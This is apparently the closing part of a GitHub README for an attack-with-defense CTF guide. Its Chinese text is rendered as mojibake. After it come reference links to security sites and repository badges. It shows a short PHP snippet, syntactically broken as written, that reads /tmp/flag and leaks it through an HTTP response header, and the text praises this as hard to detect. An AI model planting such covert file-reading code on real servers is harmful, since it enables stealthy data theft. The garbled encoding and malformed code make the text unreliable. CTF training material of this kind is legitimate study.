2ã€éšè—çš„æ–‡ä»¶è¯»å–

```php
<?php
header(php'flag:'.file_get_contents('/tmp/flag'));
```

æ¡ä»¶å…è®¸çš„è¯ï¼Œå°†flagä¿¡æ¯ç›´æ¥è¯»å–å¹¶è¿”å›åˆ°headerå¤´ä¸­ï¼Œè¿™æ ·åšä¸æ˜“è¢«å‘ç°



## 4# å‚è€ƒé“¾æ¥

- [http://freebuf.com/](http://freebuf.com/)
- [https://github.com/Huseck](https://github.com/Huseck)
- [https://blog.zgsec.cn/](https://blog.zgsec.cn/)
- [https://paper.seebug.org/3044/](https://paper.seebug.org/3044/)
- [https://www.anquanke.com/](https://www.anquanke.com/)
- [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [http://www.bugscan.net/source/template/vulns/](http://www.bugscan.net/source/template/vulns/)
- [https://xz.aliyun.com/t/12687](https://xz.aliyun.com/t/12687)


## ğŸ™ 5# æ„Ÿè°¢å„ä½å¸ˆå‚…

## Stargazers

[![Stargazers repo roster for @AabyssZG/AWD-Guide](https://reporoster.com/stars/AabyssZG/AWD-Guide)](https://github.com/AabyssZG/AWD-Guide/stargazers)


## Forkers

[![Forkers repo roster for @AabyssZG/AWD-Guide](https://reporoster.com/forks/AabyssZG/AWD-Guide)](https://github.com/AabyssZG/AWD-Guide/network/members)
